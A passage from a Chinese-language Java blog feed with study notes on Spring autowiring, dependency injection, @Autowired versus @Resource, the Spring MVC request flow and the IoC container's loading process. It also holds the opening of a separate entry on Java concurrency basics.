<h1 id="15-Spring-自动装配（auto-wire）的方式有哪些？"><a href="#15-Spring-自动装配（auto-wire）的方式有哪些？" class="headerlink" title="15. Spring 自动装配（auto wire）的方式有哪些？"></a>15. Spring 自动装配（auto wire）的方式有哪些？</h1><p>Spring 提供了5种自动装配的方式：</p>
<ol>
<li><p><code>no</code>:默认的方式是不进行自动装配，通过手工设置<code>ref</code>属性来进行装配<code>bean</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Person&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;book&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;book&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">id</span>=<span class="string">&quot;book&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Book&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>byName</code>：通过参数名自动装配，如果一个 <code>bean</code> 的 <code>name</code> 和另外一个 <code>bean</code> 的 <code>name</code> 的 <code>property</code> 相同，就自动装配。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;book&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Book&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>byType</code>：通过参数的数据类型自动装配，如果一个<code>bean</code>的数据类型和另外一个<code>bean</code>的<code>property</code>属性的数据类型兼容，就自动装配。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Person&quot;</span>  <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;book&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Book&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>construct</code>：构造方法中的参数通过<code>byType</code>的形式，自动装配。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Person&quot;</span>  <span class="attr">autowire</span>=<span class="string">&quot;constructor&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;book&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Book&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>autodetect</code>：如果有默认的构造方法，通过<code>construct</code>的方式自动装配，否则使用<code>byType</code>的方式自动装配。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Person&quot;</span>   <span class="attr">autowire</span>=<span class="string">&quot;autodetect&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;book&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.myapp.core.autowire.Book&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>自动装配不容易看出<code>bean</code>之间的引用关系，增加了阅读的复杂度，一般还是采用默认的方式手工进行配置，或者采用<code>annotation</code>的方式进行配置。</p>
</blockquote>
</li>
</ol>
<h1 id="16-依赖注入的方式有哪些？"><a href="#16-依赖注入的方式有哪些？" class="headerlink" title="16. 依赖注入的方式有哪些？"></a>16. 依赖注入的方式有哪些？</h1><ul>
<li><p>Set注入：通过声明<code>setter</code>方法，在xml文件配置类中的<code>property</code>值完成注入</p>
</li>
<li><p>接口注入:对类中的成员接口成员变量用<code>@Autowired</code>修饰，而<code>@Componnent</code>修饰的是接口的实现类</p>
</li>
<li><p>构造器的注入：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cdPlayer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.xm.demo.soundsystem.CDPlayer&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--构造函数注入，通过ref指定具体注入的对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;compactDisc1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>Autowired</code>注解注入共同点</p>
</li>
</ul>
<h1 id="17-使用-autowired-和-resource-区别？"><a href="#17-使用-autowired-和-resource-区别？" class="headerlink" title="17. 使用 autowired 和 resource 区别？"></a>17. 使用 autowired 和 resource 区别？</h1><p><code>@Autowired</code> 为 <strong>Spring 提供的注解</strong>，需要导入包 <code>org.springframework.beans.factory.annotation.Autowired</code>;只按照 <code>byType</code> 注入。</p>
<p>在装配的位置使用 <code>@Resource(name=&quot;id&quot;)</code>,代替 <code>@Autowired</code> 和 <code>@Qualifier(“name”)</code>,其作用相当于两个的结果</p>
<p><code>@Autowired</code> 注解是按照类型（<code>byType</code>）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许 null 值，可以设置它的 <code>required</code> 属性为 <code>false</code> 。如果我们想使用按照名称（<code>byName</code>）来装配，可以结合 <code>@Qualifier</code> 注解一起使用。</p>
<p><code>@Resource</code> 默认按照 <code>ByName</code> 自动注入，由<strong>J2EE提供</strong>，需要导入包 <code>javax.annotation.Resource</code>。<code>@Resource</code> 有两个重要的属性：<code>name</code> 和 <code>type</code>，而 Spring 将 <code>@Resource</code> 注解的 <code>name</code> 属性解析为 <code>bean</code> 的名字，而 <code>type</code> 属性则解析为 <code>bean</code> 的类型。所以，如果使用 <code>name</code> 属性，则使用 <code>byName</code> 的自动注入策略，而使用 <code>type</code> 属性时则使用 <code>byType</code> 自动注入策略。如果既不制定 <code>name</code> 也不制定 <code>type</code> 属性，这时将通过反射机制使用 <code>byName</code> 自动注入策略。</p>
<h1 id="18-Spring-MVC-运行机制以及运行的流程"><a href="#18-Spring-MVC-运行机制以及运行的流程" class="headerlink" title="18. Spring MVC 运行机制以及运行的流程"></a>18. Spring MVC 运行机制以及运行的流程</h1><ol>
<li>用户发送请求时会先从<code>DispatcherServlet</code>的<code>doService</code>方法开始，在该方法中会将 <code>WebApplicationContext</code>,<code>localeResolver</code>,<code>themeResolver</code>、<code>themeSource</code>  等对象添加到 <code>request</code> 中，紧接着就调用 <code>doDispatch</code> 方法。</li>
<li>进入该方法后首先会检查该请求是否是文件上传的请求（校验的规则是是否是 <code>post</code> 并且 <code>contentType</code> 是否以 <code>multipart/</code> 为前缀），即调用 <code>checkMultipart</code> 方法，是的话就将 <code>request</code> 包装成 <code>MultipartHttpServletRequet</code>。</li>
<li>然后调用 <code>getHandler</code> 方法来匹配每个 <code>HandlerMapping</code> 对象，如果匹配成功会返回这个 <code>Handle</code> 的处理链 <code>HandlerExecutionChain</code> 对象，在获取该对象的内部其实也获取我们自定定义的拦截器，并执行了其中的方法。</li>
<li>执行拦截器的 <code>preHandle</code> 方法，如果返回 <code>false</code> 执行 <code>afterCompletion</code> 方法并立即返回。</li>
<li>通过上述获取到了 <code>HandlerExecutionChain</code> 对象，通过该对象的 <code>getHandler()</code> 方法获得一个 <code>object</code> 通过 <code>HandlerAdapter</code> 进行封装得到 <code>HandlerAdapter</code> 对象。</li>
<li>该对象调用 <code>handle</code> 方法来执行 <code>Controller</code> 中的方法，该对象如果返回一个 <code>ModelAndView</code> 给 <code>DispatcherServlet</code>。</li>
<li><code>DispatcherServlet</code> 借助 <code>ViewResolver</code> 完成逻辑视图名到真实视图对象的解析，得到 <code>View</code> 后 <code>DispatcherServlet</code> 使用这个 <code>View</code> 对 <code>ModelAndView</code> 中的模型数据进行视图渲染。</li>
</ol>
<h1 id="19-Spring-IOC-的加载过程"><a href="#19-Spring-IOC-的加载过程" class="headerlink" title="19. Spring IOC 的加载过程"></a>19. Spring IOC 的加载过程</h1><h2 id="首先是容器的初始化"><a href="#首先是容器的初始化" class="headerlink" title="首先是容器的初始化"></a>首先是容器的初始化</h2><p>启动容器，实际上指的就是实例化ApplicationContext的这个动作。只是在不同情况下可能有不同的表现形式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(applicationContext.xml”);</span><br></pre></td></tr></table></figure>

<p>ClassPathXmlApplicationContext 的容器初始化我们大致分为下面几步：</p>
<ol>
<li>BeanDefinition 的 Resource 定位，这里的 <code>Resource</code> 定位是通过继承 <code>ResourceLoader</code> 获得的，<code>ResourceLoader</code> 代表了<strong>加载资源的一种方式，正是策略模式的实现</strong>。</li>
<li>从 <code>Resource</code>中解析、载入 <code>BeanDefinition</code></li>
<li><code>BeanDefinition</code> 在IoC 容器中的注册</li>
</ol>
<p>从构造函数入手</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClassPathXmlApplicationContext</span><span class="params">(String[] configLocations, <span class="keyword">boolean</span> refresh, ApplicationContext parent)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>(parent);</span><br><span class="line">    setConfigLocations(configLocations);</span><br><span class="line">    <span class="keyword">if</span> (refresh) &#123;</span><br><span class="line">        refresh();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数<code>configLocations</code>就是 XML 配置文件的 <code>classpath</code>。</p>
<p><code>setConfigLocations(configLocations)</code>这里就是把一些带有占位符的地址解析成实际的地址。</p>
<p>再之后就是 <code>refresh</code>，容器的初始化就在这里开始，这里取名为refresh，是因为容器启动之后，再调用 <code>refresh()</code>会刷新IoC 容器。</p>
<p><code>refresh</code> 的工作流程大概有以下几点：</p>
<ul>
<li><code>prepareRefresh()</code> 创建容器前的准备工作</li>
<li><code>obtainFreshBeanFactory()</code> 创建 BeanFactory</li>
<li><code>prepareBeanFactory(beanFactory)</code> 对BeanFactory进行一些特征的设置工作</li>
<li><code>finishBeanFactoryInitialization(beanFactory)</code> 初始化所有的 singleton beans（DI的入口）</li>
</ul>
<h3 id="prepareRefresh-创建容器前的准备工作"><a href="#prepareRefresh-创建容器前的准备工作" class="headerlink" title="prepareRefresh() 创建容器前的准备工作"></a>prepareRefresh() 创建容器前的准备工作</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">prepareRefresh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 记录启动时间，</span></span><br><span class="line">   <span class="comment">// 将 active 属性设置为 true，closed 属性设置为 false，它们都是 AtomicBoolean 类型</span></span><br><span class="line">   <span class="keyword">this</span>.startupDate = System.currentTimeMillis();</span><br><span class="line">   <span class="keyword">this</span>.closed.set(<span class="keyword">false</span>);</span><br><span class="line">   <span class="keyword">this</span>.active.set(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">      logger.info(<span class="string">&quot;Refreshing &quot;</span> + <span class="keyword">this</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Initialize any placeholder property sources in the context environment</span></span><br><span class="line">   initPropertySources();</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 校验 xml 配置文件</span></span><br><span class="line">   getEnvironment().validateRequiredProperties();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">this</span>.earlyApplicationEvents = <span class="keyword">new</span> LinkedHashSet&lt;ApplicationEvent&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="obtainFreshBeanFactory-创建-Bean-容器，加载并注册-Bean"><a href="#obtainFreshBeanFactory-创建-Bean-容器，加载并注册-Bean" class="headerlink" title="obtainFreshBeanFactory() 创建 Bean 容器，加载并注册 Bean"></a>obtainFreshBeanFactory() 创建 Bean 容器，加载并注册 Bean</h3><p>这是 IOC 初始化里面最重要的部分，<strong>在这步完成以后，Bean 并没有完成初始化，实际的实例并没有被创建，只是完成了 BeanFactory 的实例化</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ConfigurableListableBeanFactory <span class="title">obtainFreshBeanFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 关闭旧的 BeanFactory (如果有)，创建新的 BeanFactory，加载 Bean 定义、注册 Bean 等等,其实现看下一段代码</span></span><br><span class="line">    refreshBeanFactory();</span><br><span class="line">    <span class="comment">// 返回上一步刚刚创建的BeanFactory</span></span><br><span class="line">    ConfigurableListableBeanFactory beanFactory = getBeanFactory();</span><br><span class="line">    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">&quot;Bean factory for &quot;</span> + getDisplayName() + <span class="string">&quot;: &quot;</span> + beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> beanFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在关闭旧的 <code>BeanFactory</code> 并创建新的 <code>BeanFactory</code> 过程当中，会设置 <code>BeanFactory</code> 的两个重要属性，一个是<strong>是否允许 Bean 覆盖,是否允许循环使用</strong>，另外一个是<strong>加载 <code>BeanDefinition</code> 到 <code>BeanFactory</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">refreshBeanFactory</span><span class="params">()</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">    <span class="comment">// 如果 ApplicationContext 已经加载过 BeanFactory，销毁所有的Bean，关闭BeanFactory</span></span><br><span class="line">    <span class="comment">// 注意点：应用中BeanFactory是可以有多个的，这里可不是说全局是否有BeanFactory</span></span><br><span class="line">    <span class="comment">// 而是说当前的ApplicationContext有没有BeanFactory！</span></span><br><span class="line">    <span class="keyword">if</span> (hasBeanFactory()) &#123;</span><br><span class="line">        destroyBeans();</span><br><span class="line">        closeBeanFactory();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化一个 DefaultListableBeanFactory</span></span><br><span class="line">        DefaultListableBeanFactory beanFactory = createBeanFactory();</span><br><span class="line">        <span class="comment">// 用于 BeanFactory 的序列化，一般人应该用不到吧...</span></span><br><span class="line">        beanFactory.setSerializationId(getId());</span><br><span class="line">        <span class="comment">// 下面是两个重点方法</span></span><br><span class="line">        <span class="comment">// 设置 BeanFactory 的两个重要属性</span></span><br><span class="line">        <span class="comment">// 是否允许 Bean 覆盖、是否允许循环引用 TODO 2.1</span></span><br><span class="line">        customizeBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载BeanDefinition到BeanFactory  单独拉出来讲</span></span><br><span class="line">        loadBeanDefinitions(beanFactory);</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>.beanFactoryMonitor) &#123;</span><br><span class="line">            <span class="keyword">this</span>.beanFactory = beanFactory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ApplicationContextException(<span class="string">&quot;I/O error parsing bean definition source for &quot;</span> + getDisplayName(), ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="设置是否允许覆盖和循环使用"><a href="#设置是否允许覆盖和循环使用" class="headerlink" title="设置是否允许覆盖和循环使用"></a>设置是否允许覆盖和循环使用</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">customizeBeanFactory</span><span class="params">(DefaultListableBeanFactory beanFactory)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.allowBeanDefinitionOverriding != <span class="keyword">null</span>) &#123;</span><br><span class="line">		beanFactory.setAllowBeanDefinitionOverriding(<span class="keyword">this</span>.allowBeanDefinitionOverriding);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.allowCircularReferences != <span class="keyword">null</span>) &#123;</span><br><span class="line">		beanFactory.setAllowCircularReferences(<span class="keyword">this</span>.allowCircularReferences);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>BeanDefinition</code> 的覆盖问题可能会有开发者碰到这个坑，就是在配置文件中定义 <code>bean</code> 时使用了相同的 <code>id</code> 或 <code>name</code>，默认情况下，<code>allowBeanDefinitionOverriding</code> 属性为 null（Boolean类型），如果在同一配置文件中重复了，会抛错，但是如果不是同一配置文件中，会发生覆盖。</p>
<p>循环引用也很好理解：A 依赖 B，而 B 依赖 A。或 A 依赖 B，B 依赖 C，而 C 依赖 A。</p>
<p>默认情况下，Spring 允许循环依赖，当然如果你在 A 的构造方法中依赖 B，在 B 的构造方法中依赖 A 是不行的。</p>
<h4 id="加载-BeanDefinition-到-BeanFactory"><a href="#加载-BeanDefinition-到-BeanFactory" class="headerlink" title="加载 BeanDefinition 到 BeanFactory"></a>加载 BeanDefinition 到 BeanFactory</h4><p>这里载入分为两大步:</p>
<ol>
<li>一就是通过调用 XML 的解析器获取到 document 对象，完成通用 XML 解析；</li>
<li>二就是按照 Spring 的 Bean 规则进行解析。Spring 的 Bean 规则进行解析这个过程是 <code>BeanDefinitionDocumentReader</code> 来实现的，里面包含了各种Spring Bean 定义规则的处理。</li>
</ol>
<h3 id="prepareBeanFactory（beanFactory）-对-BeanFactory-进行一些特征设置工作"><a href="#prepareBeanFactory（beanFactory）-对-BeanFactory-进行一些特征设置工作" class="headerlink" title="prepareBeanFactory（beanFactory） 对 BeanFactory 进行一些特征设置工作"></a>prepareBeanFactory（beanFactory） 对 BeanFactory 进行一些特征设置工作</h3><p>主要包括设置：当前 <code>ApplicationContext</code> 的类加载器、添加一个<code>ApplicationContextAwareProcessor</code>，主要针对实现了 <code>Aware</code> 接口的<code>Bean</code>等等</p>
<h3 id="finishBeanFactoryInitialization-beanFactory-实例化所有单例"><a href="#finishBeanFactoryInitialization-beanFactory-实例化所有单例" class="headerlink" title="finishBeanFactoryInitialization(beanFactory) 实例化所有单例"></a>finishBeanFactoryInitialization(beanFactory) 实例化所有单例</h3><p>这里会负责初始化所有的 <code>singleton beans</code>。</p>
<p>Spring 会在这个阶段完成所有的 <code>singleton beans</code> 的实例化。</p>
<p>到目前为止，应该说 <code>BeanFactory</code> 已经创建完成，并且所有的实现了 <code>BeanFactoryPostProcessor</code> 接口的 <code>Bean</code> 都已经初始化并且其中的 <code>postProcessBeanFactory(factory)</code> 方法已经得到回调执行了。而且 Spring 已经“手动”注册了一些特殊的 Bean，如 <code>environment</code>、<code>systemProperties</code> 等。</p>
<p>剩下的就是初始化 <code>singleton beans</code> 了，我们知道它们是单例的，<strong>如果没有设置懒加载</strong>，那么 Spring 会在接下来初始化所有的 <code>singleton beans</code>。</p>
<h2 id="第二大步就是依赖注入的过程"><a href="#第二大步就是依赖注入的过程" class="headerlink" title="第二大步就是依赖注入的过程"></a>第二大步就是依赖注入的过程</h2><p>容器初始化中，<code>finishBeanFactoryInitialization(beanFactory)</code>实例化所有单例，调用了<code>getBean()</code> 方法来做 <code>singleton bean</code> 的实例化操作。这就是Spring IoC 依赖注入的入口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> doGetBean(name, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="doGetBean"><a href="#doGetBean" class="headerlink" title="doGetBean()"></a>doGetBean()</h3><p>这一步主要完成以下功能：</p>
<ul>
<li><code>beanName</code> 解析转换</li>
<li>检测手动注册 Bean</li>
<li>双亲容器检测</li>
<li>依赖初始化（递归）</li>
<li>创建Bean <code>createBean()</code></li>
</ul>
<h3 id="createBean"><a href="#createBean" class="headerlink" title="createBean()"></a>createBean()</h3><ol>
<li>开始是单例的话要先清除缓存；</li>
<li>实例化 bean，将 <code>BeanDefinition</code> 转换为 <code>BeanWrapper</code>；</li>
<li>使用 <code>MergedBeanDefinitionPostProcessor</code>，<code>Autowired</code>注解就是通过此方法实现类型的预解析；</li>
<li>解决循环依赖问题；</li>
<li>填充属性，将属性填充到 <code>bean</code> 实例中；</li>
<li>注册 <code>DisposableBean</code>；</li>
<li>创建完成并返回</li>
</ol>
<h1 id="20-Spring-Spring-MVC-Spring-Boot-三者的联系和区别"><a href="#20-Spring-Spring-MVC-Spring-Boot-三者的联系和区别" class="headerlink" title="20. Spring,Spring MVC,Spring Boot 三者的联系和区别"></a>20. Spring,Spring MVC,Spring Boot 三者的联系和区别</h1><p><img src="http://qiniu.xiaoming.net.cn/Spring%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84.png" alt="Spring整体架构"></p>
<p>总的来说 Spring 是使用基本的 JavaBean 代替 EJB，通过容器管理 JavaBean 的配置和声明周期，在此基础上实现了 AOP、IOC 的 Spring 核心功能，其他 web 框架组件在 AOP、IOC 的基础上工作，将 JavaBean 交给 Spring 来管理。简单来说，Spring 是一个轻量级的控制反转（IoC）和面向切面（AOP）的容器框架。</p>
<p>Spring MVC就是一个MVC框架，其实都是属于Spring，Spring MVC 需要有 Spring 的架包作为支撑才能跑起来。</p>
<p>Spring 可以说是一个管理 bean 的容器，也可以说是包括很多开源项目的总称，spring mvc 是其中一个开源项目，所以简单走个流程的话，http 请求一到，由容器（如：tomact）解析 http 搞成一个 request，通过映射关系（路径，方法，参数啊）被 spring mvc 一个分发器去找到可以处理这个请求的bean，那 tomcat 里面就由 spring 管理 bean 的一个池子（bean容器）里面找到，处理完了就把响应返回回去。</p>
<p>Spring Boot 不是一门新技术。从本质上来说，Spring Boot 就是 Spring，它做了一些对 Spring Bean 的默认配置。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>并发</title>
    <url>/2020/11/11/12%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><blockquote>
<p>多线程能够提高内存的使用率，提高程序的响应程度</p>
<p>JVM是多线程（main(主线程)，GC线程，异常处理线程）</p>
</blockquote>
<p>IO操作不占用CPU,只是我们一般拷贝文件使用的是<code>阻塞IO</code>，但会一直等待IO结束，没能充分利用线程</p>
<ul>
<li>有<code>非阻塞IO</code>和<code>异步IO</code>优化</li>
</ul>
<h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><h4 id="1、进程与线程"><a href="#1、进程与线程" class="headerlink" title="1、进程与线程"></a>1、进程与线程</h4><p><img src="https://camo.githubusercontent.com/a66819fd82c6adfa69b368edf3c52b1fa9cdc89d/68747470733a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f323031392d332f4a564de8bf90e8a18ce697b6e695b0e68daee58cbae59f9f2e706e67" alt="java运行时内存区域"></p>
<blockquote>
<p>进程process：操作系统分配和调度的基本单位，进程是线程的容器，是程序的实体，拥有独立的内存空间</p>
<p>线程thread：操作系统进行运算调度的最小单位，与其他线程共享内存空间</p>
<p>多个线程共享进程的<strong>堆</strong>和<strong>方法区</strong>资源（<strong>JDK1.8之后使用元空间</strong>），但是每个线程有自己的<strong>程序计数器，虚拟机栈和本地方法栈</strong></p>
<ul>
<li><p>堆是进程中最大的一块内存，主要用于存放新创建的对象 (所有对象都在这里分配内存)</p>
</li>
<li><p>方法区主要用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 </p>
</li>
</ul>
<p>线程和进程最大的不同在于基本上各个进程都是独立的，而线程则不一定，同一进程中的不同线程极有可能相互影响。线程执行开销小，但不利于资源的管理和保护；进程则相反。</p>
</blockquote>
<h5 id="1-1-进程通信"><a href="#1-1-进程通信" class="headerlink" title="1.1 进程通信"></a>1.1 进程通信</h5><ul>
<li>同一台计算机进程通信称为IPC</li>
<li>不同计算机之间的进程通过网络，遵守共同的协议HTTP</li>
</ul>
<h5 id="1-2-线程通信"><a href="#1-2-线程通信" class="headerlink" title="1.2 线程通信"></a>1.2 线程通信</h5><ul>
<li>由于线程之间共享内存，多个线程可以访问同一个共享变量</li>
<li>线程更轻量，线程的上下文切换成本一般比进程低</li>
</ul>
<h4 id="2、并行与并发"><a href="#2、并行与并发" class="headerlink" title="2、并行与并发"></a>2、并行与并发</h4><blockquote>
<p>并行：多个CPU同时执行不同的任务 parallel</p>
<p>并发：由CPU的任务调度器完成，轮流运行 concurrent</p>
</blockquote>
<blockquote>
<p>异步：更像一个消息传递，一旦开始，<strong>方法调用就会立即返回</strong>，调用者可以继续后续的操作</p>
<p>同步：形容一次方法调用。同步方法调用一旦开始，调用者必须<strong>等到方法调用返回后</strong>，才能继续后续的行为</p>
</blockquote>
<blockquote>
<p>高并发：响应时间，吞吐量，并发用户数</p>
</blockquote>
<h4 id="3、线程调度模型"><a href="#3、线程调度模型" class="headerlink" title="3、线程调度模型"></a>3、线程调度模型</h4><ul>
<li><p>分时调度模型：所有线程<strong>轮流使用</strong>CPU，平均分配每个线程占用CPU的时间片</p>
</li>
<li><p>抢占式调度模型：优先级高的线程使用CPU，优先级相同，则随机选择一个(JVM)</p>
</li>
</ul>
<h4 id="4、线程三个特性"><a href="#4、线程三个特性" class="headerlink" title="4、线程三个特性"></a>4、线程三个特性</h4><h5 id="4-1-原子性"><a href="#4-1-原子性" class="headerlink" title="4.1 原子性"></a>4.1 原子性</h5><blockquote>
<p>原子操作：只有简单的读取、赋值（而且必须是将数字赋值给某个变量，变量之间的相互赋值不是原子操作）才是原子操作</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;  <span class="comment">//语句1直接将数值10赋值给a，也就是说线程执行这个语句的会直接将数值10写入到工作内存中。</span></span><br></pre></td></tr></table></figure>

<p><strong>一个操作是不可中断，要么全部执行成功要么全部执行失败</strong></p>
<p>​    即多个线程一起执行的时候，一个操作一旦开始，就不会被其他线程所干扰。</p>
<h5 id="4-2-有序性"><a href="#4-2-有序性" class="headerlink" title="4.2 有序性"></a>4.2 有序性</h5><blockquote>
<p>有序性：是指程序执行的顺序按照代码的先后顺序执行。</p>
</blockquote>
<p><strong>Java内存模型具备一些先天的“有序性”，即不需要通过任何手段就能够得到保证的有序性，这个通常也称为 happens-before 原则。如果两个操作的执行次序无法从happens-before原则推导出来，那么它们就不能保证它们的有序性，虚拟机可以随意地对它们进行重排序</strong></p>
<h5 id="4-3-可见性"><a href="#4-3-可见性" class="headerlink" title="4.3 可见性"></a>4.3 可见性</h5><blockquote>
<p>可见性：当一个线程修改了共享变量后，其他线程能够立即得知这个修改。</p>
</blockquote>
<h3 id="二、Java多线程"><a href="#二、Java多线程" class="headerlink" title="二、Java多线程"></a>二、Java多线程</h3><blockquote>
<p>主线程：在main方法中</p>
<p>子线程：main方法中启动的其他线程（与主线程平等相同）</p>
<p>主线程放在子线程后，否则会优先执行主线程，线程多次在运行、阻塞之间切换</p>
</blockquote>
<h4 id="1、启动创建线程"><a href="#1、启动创建线程" class="headerlink" title="1、启动创建线程"></a>1、启动创建线程</h4><blockquote>
<p>调用start方法方可启动线程，而run方法只是thread的一个普通方法调用，还是在主线程里执行</p>
</blockquote>
<h5 id="1-1-继承Thread"><a href="#1-1-继承Thread" class="headerlink" title="1.1 继承Thread"></a>1.1 继承Thread</h5><p><strong>创建该类的实例，即创建了线程对象</strong></p>
